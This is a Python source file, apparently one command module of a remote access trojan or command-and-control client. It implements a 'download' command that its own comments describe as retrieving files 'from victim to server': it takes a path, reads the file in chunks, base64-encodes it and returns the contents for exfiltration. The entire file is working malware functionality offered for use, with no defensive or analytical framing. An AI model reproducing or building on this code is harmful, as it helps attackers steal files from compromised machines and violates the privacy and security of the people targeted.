# Download command - retrieve file from client to server.

import base64
import logging
import os
from typing import Any, Dict

from client.commands.base import BaseCommand

logger = logging.getLogger(__name__)


def _validate_path(path: str) -> bool:
    # Validate that the path doesn't contain null bytes or control characters.
    
    # Args:
    #     path: The path to validate
    # Returns:
    #     bool: True if path is valid, False otherwise
    
    # Check for null bytes
    if '\x00' in path:
        return False
        
    # Check for control characters (except tab, newline, carriage return)
    for char in path:
        if ord(char) < 32 and char not in ('\t', '\n', '\r'):
            return False
            
    return True

# Chunk size for reading/encoding files (1 MB)
# Base64 increases size by ~33%, so 1MB binary -> ~1.33MB encoded
CHUNK_SIZE = 1024 * 1024


class DownloadCommand(BaseCommand):
    # Retrieve a file from the client (victim) to the server.

    @property
    def name(self) -> str:
        return "download"

    @property
    def description(self) -> str:
        return "Retrieve file from victim to server"

    def execute(self, params: Dict[str, Any]) -> Dict[str, Any]:
        # Execute the download command.
        remote_path = params.get("remote_path") or params.get("path")
        if not remote_path:
            return self._error_response("Missing required parameter: remote_path")
        
        # Validate path for security issues
        if not isinstance(remote_path, str):
            return self._error_response("Invalid parameter: remote_path must be a string")
            
        if not _validate_path(remote_path):
            return self._error_response("Invalid parameter: remote_path contains null bytes or control characters")

        try:
            # Validate and normalize the path
            remote_path = os.path.normpath(remote_path)

            # Check if file exists
            if not os.path.exists(remote_path):
                return self._error_response(f"File not found: {remote_path}")

            # Check if it's a file (not a directory)
            if not os.path.isfile(remote_path):
                return self._error_response(f"Not a file: {remote_path}")

            # Get file info
            file_stat = os.stat(remote_path)
            file_size = file_stat.st_size

            logger.info(f"Downloading file: {remote_path} ({file_size} bytes)")

            # Stream file reading and base64 encoding to avoid loading
            # entire file into memory twice (raw + encoded)
            encoded_chunks = []
            bytes_read = 0
            progress_percent = 0

            with open(remote_path, "rb") as f:
                while True:
                    chunk = f.read(CHUNK_SIZE)
                    if not chunk:
                        break
                    # Encode each chunk immediately to avoid holding raw data
                    encoded_chunks.append(base64.b64encode(chunk).decode("utf-8"))
                    bytes_read += len(chunk)
                    # Log progress at 25% intervals
                    if file_size > 0:
                        new_percent = int((bytes_read / file_size) * 100)
                        if new_percent >= progress_percent + 25:
                            progress_percent = (new_percent // 25) * 25
                            logger.info(
                                f"Download progress: {progress_percent}% "
                                f"({bytes_read}/{file_size} bytes)"
                            )

            # Combine encoded chunks (only the encoded version stays in memory)
            encoded_content = "".join(encoded_chunks)

            logger.info(f"File download complete: {remote_path} ({bytes_read} bytes)")

            return {
                "success": True,
                "remote_path": remote_path,
                "size": file_size,
                "content": encoded_content,
                "encoding": "base64",
                "message": f"Successfully downloaded {remote_path}",
            }

        except PermissionError as e:
            logger.error(f"Permission denied accessing {remote_path}: {e}")
            return self._error_response(f"Permission denied: {remote_path}")
        except OSError as e:
            logger.error(f"OS error accessing {remote_path}: {e}")
            return self._error_response(f"Error accessing file: {e}")

    def _error_response(self, message: str) -> Dict[str, Any]:
        # Create an error response.
        return {
            "success": False,
            "error": message,
        }
